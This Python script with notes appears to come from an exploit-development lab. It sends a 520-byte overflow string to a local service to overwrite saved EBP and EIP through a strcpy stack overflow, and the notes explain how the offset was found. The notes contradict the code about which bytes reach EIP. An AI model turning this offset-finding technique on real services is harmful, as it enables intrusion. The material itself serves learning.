import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 8421))

#get the banner
msg = sock.recv(2048).decode()
print(msg)

badstr = "A" * 512
# fill the stack with 512 bytes of A's followed by an additional 4 bytes of A's to
# fill ebp and finally 4 bytes of B's to fill eip.
cmd = badstr + "AAAA" + "BBBB"
print(f"Sending payload of length {len(cmd)}")
sock.send(cmd.encode("ascii"))

#get the response to help
msg = sock.recv(2048).decode()
print(msg)


sock.close()

"""
Notes:
The first length in which the application will crash is 512 bytes. This length fully 
overwrites the stack of isASCII and I would imagine makes the value of esp go untraced
so the program just crashes. This value is a little higher than what I had guessed at 
first of 508 bytes. There is likely another pointer or something being pushed to the
stack before the overflow occurs which accounts for the 4 byte difference.

eip is filled with 42424242 at 516 bytes of A's and 4 bytes of B's so 520 bytes in
total. It took another 4 bytes of A's to fill ebp and then 4 bytes of B's to fill eip
so it makes sense to have a 520 byte payload. Before I found out there was an additional
4 bytes unaccounted for, I would have imagined eip being filled at 516 bytes.

basically speaking, you declare three local variables onto the stack frame of isASCII;
a 500 byte char array, and two integers which are 4 bytes each, totalling 508 bytes.
then, you call strcpy which will copy everything from rawInput into cmdToParse, but
under the hood, strcpy will return a char pointer which is 4 bytes, so now the stack
frame is basically 512 bytes. from this, we can take that space up with 512 A's, and
use 4 B's to flood the saved ebp and 4 C's to flood eip.

strcpy causes the overflow
when attempting to return back to the previous function will crash the program - there is no specific line that will casue this

1072 bytes of malware from parseCommand function
"""